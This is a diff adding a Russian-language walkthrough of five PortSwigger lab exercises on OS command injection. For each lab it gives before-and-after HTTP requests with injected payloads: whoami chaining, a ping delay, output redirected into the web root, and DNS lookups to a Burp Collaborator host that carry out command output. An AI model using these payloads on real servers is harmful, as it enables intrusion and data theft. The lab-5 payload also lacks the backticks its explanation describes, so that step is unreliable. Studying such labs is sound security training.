@@ -1,0 +1,148 @@
+command injection
+
+Ниже подробный разбор с примерами «Как было» и «Как стало» (с примерами реальных HTTP-запросов и ответов) для каждой из 5 лабораторий.
+1. OS command injection, simple case
+Что и где меняем
+ * Где: В POST-запросе проверки товара (/product/stock).
+ * Параметр: storeId.
+До и после
+До (Обычный запрос приложения):
+POST /product/stock HTTP/1.1
+Host: academy.web-security-academy.net
+...
+
+productId=1&storeId=1
+
+ * Что делает сервер на фоне: Выполняет системную команду проверки остатка на складе:
+   /usr/local/bin/check_stock 1 1
+
+ * Ответ сервера: Возвращает количество товара на складе (например, 29).
+После (Внедрение пейлоада):
+POST /product/stock HTTP/1.1
+Host: academy.web-security-academy.net
+...
+
+productId=1&storeId=1||whoami
+
+ * Что делает сервер на фоне: Вставляет наш ввод прямо в консоль ОС:
+   /usr/local/bin/check_stock 1 1 || whoami
+
+ * Ответ сервера: Вместо обычного числа в ответе приходит имя текущего пользователя ОС:
+   HTTP/1.1 200 OK
+...
+
+peter-abc123
+
+2. Blind OS command injection with time delays
+Что и где меняем
+ * Где: В POST-запросе формы обратной связи (/feedback/submit).
+ * Параметр: email.
+До и после
+До (Обычный запрос приложения):
+POST /feedback/submit HTTP/1.1
+Host: academy.web-security-academy.net
+...
+
+csrf=xxx&name=User&email=test@example.com&subject=Test&message=Hello
+
+ * Что делает сервер на фоне: Вызывает скрипт отправки письма:
+   /usr/sbin/sendmail test@example.com
+
+ * Ответ сервера: Запрос обрабатывается мгновенно (за 100–200 мс).
+После (Внедрение пейлоада):
+POST /feedback/submit HTTP/1.1
+Host: academy.web-security-academy.net
+...
+
+csrf=xxx&name=User&email=x||ping+-c+10+127.0.0.1||&subject=Test&message=Hello
+
+ * Что делает сервер на фоне: Выполняет цепочку команд:
+   /usr/sbin/sendmail x || ping -c 10 127.0.0.1 ||
+
+ * Ответ сервера: Текст ответа не меняется (вывод команды не виден), но сервер зависает ровно на 10 секунд перед отправкой ответа. Это подтверждает уязвимость.
+3. Blind OS command injection with output redirection
+Что и где меняем
+ * Где:
+   * В параметре email формы /feedback/submit.
+   * В URL запрашиваемого файла /image?filename=....
+До и после
+До (Обычная работа с файлами):
+В приложении изображения запрашиваются из папки /var/www/static/ с помощью параметров вида:
+GET /image?filename=7.jpg HTTP/1.1
+
+После (Шаг 1: Запись результатов работы команды в файл):
+В форме обратной связи передаем:
+POST /feedback/submit HTTP/1.1
+Host: academy.web-security-academy.net
+...
+
+csrf=xxx&name=User&email=x||whoami+>/var/www/static/output.txt||&subject=Test&message=Hello
+
+ * Что делает сервер на фоне:
+   /usr/sbin/sendmail x || whoami > /var/www/static/output.txt ||
+
+   Команда whoami исполняется, а вывод перенаправляется (>) в текстовый файл output.txt в публичной директиве.
+После (Шаг 2: Чтение записанного файла):
+Запрашиваем только что созданный файл через параметр загрузки изображений:
+GET /image?filename=output.txt HTTP/1.1
+
+ * Ответ сервера: Сервер читает файл output.txt и отдаёт имя пользователя:
+   HTTP/1.1 200 OK
+...
+
+peter-abc123
+
+4. Blind OS command injection with out-of-band interaction
+Что и где меняем
+ * Где: В POST-запросе формы обратной связи (/feedback/submit).
+ * Параметр: email.
+До и после
+До (Обычный запрос):
+POST /feedback/submit HTTP/1.1
+Host: academy.web-security-academy.net
+...
+
+csrf=xxx&name=User&email=test@example.com&subject=Test&message=Hello
+
+После (Внедрение пейлоада):
+POST /feedback/submit HTTP/1.1
+Host: academy.web-security-academy.net
+...
+
+csrf=xxx&name=User&email=x||nslookup+xyz.oastify.com||&subject=Test&message=Hello
+
+(где xyz.oastify.com — ваш уникальный адрес из Burp Collaborator)
+ * Что делает сервер на фоне:
+   /usr/sbin/sendmail x || nslookup xyz.oastify.com ||
+
+ * Результат:
+   * В самом HTTP-ответе приложения ничего не изменится.
+   * Однако в окне Burp Collaborator появится событие (DNS query): сервер веб-приложения обратится к DNS для резолва домена xyz.oastify.com.
+5. Blind OS command injection with out-of-band data exfiltration
+Что и где меняем
+ * Где: В POST-запросе формы обратной связи (/feedback/submit).
+ * Параметр: email.
+До и после
+До (Обычный запрос):
+POST /feedback/submit HTTP/1.1
+Host: academy.web-security-academy.net
+...
+
+csrf=xxx&name=User&email=test@example.com&subject=Test&message=Hello
+
+После (Внедрение пейлоада):
+POST /feedback/submit HTTP/1.1
+Host: academy.web-security-academy.net
+...
+
+csrf=xxx&name=User&email=x||nslookup+whoami.xyz.oastify.com||&subject=Test&message=Hello
+
+ * Что делает сервер на фоне:
+   * Выполняет команду whoami внутри обратных кавычек. Допустим, она вернула peter-abc123.
+   * Подставляет результат в DNS-запрос:
+     /usr/sbin/sendmail x || nslookup peter-abc123.xyz.oastify.com ||
+
+ * Результат:
+   В окне Burp Collaborator вы увидите входящий DNS-запрос на имя домена вида:
+   peter-abc123.xyz.oastify.com
+   Префикс peter-abc123 и является украденными данными (результатом выполнения команды whoami).
